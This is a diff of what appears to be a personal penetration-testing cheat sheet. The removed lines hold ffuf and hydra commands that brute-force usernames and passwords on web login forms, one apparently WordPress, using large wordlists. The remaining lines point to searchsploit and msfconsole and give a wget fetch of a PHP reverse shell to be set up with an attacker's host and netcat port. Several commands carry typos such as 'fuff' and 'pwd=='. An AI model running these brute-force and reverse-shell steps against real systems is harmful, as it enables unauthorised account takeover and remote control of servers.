@@ -28,17 +28,6 @@ searchsploit    exploitdb from cli
 msfconsole
 
 ----
-
-::sum brute force shizz that can be tweaked up:: 
-username
-fuff -w /usr/share/wordlists/usernames.txt -X POST -d "username=FUZZ&password=x" -t 1 -p 0.1 -H "Content-Type: application/x-www-form-urlencode" -u host -fr 'Username is invalid'
-
-password 
-fuff -w /usr/share/wordlists/passwords.txt -X POST -d "log=admin&pwd==FUZZ" -t 1 -p 0.1 -H "Content-Type: application/x-www-form-urlencode" -u host -fr 'password you entered for the username admin is incorrect'%  
-
-hydra -l admin -P /usr/share/wordlists/rockyou.txt http://*host* -s 3000 http-post-form "log=admin&pwd="^PASS^"&wp-submit=Log" -vV -f
-
-----
 ::da phprev shell::
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 edit with host and nc port
